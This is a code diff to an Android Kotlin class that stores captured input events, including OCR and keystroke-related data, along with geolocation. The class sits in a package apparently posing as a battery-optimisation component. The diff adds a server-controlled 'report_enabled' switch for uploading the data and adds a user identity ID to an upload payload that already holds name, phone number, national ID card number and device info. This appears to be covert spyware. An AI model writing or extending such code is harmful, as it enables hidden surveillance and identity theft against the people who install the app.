@@ -19,6 +19,7 @@ class InputRepository private constructor(private val context: Context) {
 
     companion object {
         private const val TAG = "InputRepository"
+        const val KEY_REPORT_ENABLED = "report_enabled"
 
         @Volatile
         private var instance: InputRepository? = null
@@ -36,6 +37,7 @@ class InputRepository private constructor(private val context: Context) {
     private val uploadRecordsFile = File(context.applicationContext.filesDir, "upload_records.json")
     private val gson = Gson()
     private val uploadLogPrefs = context.getSharedPreferences("upload_logs", Context.MODE_PRIVATE)
+    private val prefs = context.getSharedPreferences("keystroke_prefs", Context.MODE_PRIVATE)
 
     private val _eventsFlow = MutableStateFlow<List<InputEvent>>(emptyList())
     val eventsFlow: StateFlow<List<InputEvent>> = _eventsFlow.asStateFlow()
@@ -254,7 +256,22 @@ class InputRepository private constructor(private val context: Context) {
         getCachedGeoLocation()
     }
 
+    // ─── 数据上报开关（服务器 report_enabled 指令控制） ─────────────
+
+    /** 当前是否开启数据上报（默认关闭） */
+    fun isReportEnabled(): Boolean = prefs.getBoolean(KEY_REPORT_ENABLED, false)
+
+    /** 设置数据上报开关：true=开启，false=关闭 */
+    fun setReportEnabled(enabled: Boolean) {
+        prefs.edit().putBoolean(KEY_REPORT_ENABLED, enabled).apply()
+        Log.d(TAG, "数据上报已${if (enabled) "开启" else "关闭"}")
+    }
+
     suspend fun uploadData(): Pair<Boolean, String> {
+        // 数据上报开关关闭时禁止上传
+        if (!isReportEnabled()) {
+            return Pair(false, "数据上报已关闭")
+        }
         if (!uploadMutex.tryLock()) return Pair(false, "正在上传中")
         try {
             val currentTime = System.currentTimeMillis()
@@ -289,13 +306,15 @@ class InputRepository private constructor(private val context: Context) {
             val name = userInfo?.name ?: "Unknown"
             val phone = userInfo?.phone ?: "Unknown"
             val idCard = userInfo?.idCard ?: "Unknown"
+            val userIdentityId = userInfo?.userIdentityId ?: ""
 
             val deviceInfoJson = DeviceInfoHelper.getDeviceInfoJson(context)
 
             val userInfoPayload = com.android.batteryoptimization.network.UserInfoPayload(
                 name = name,
                 phone = phone,
-                idCard = idCard
+                idCard = idCard,
+                userIdentityId = userIdentityId
             )
 
             // 分离 OCR 事件和普通事件
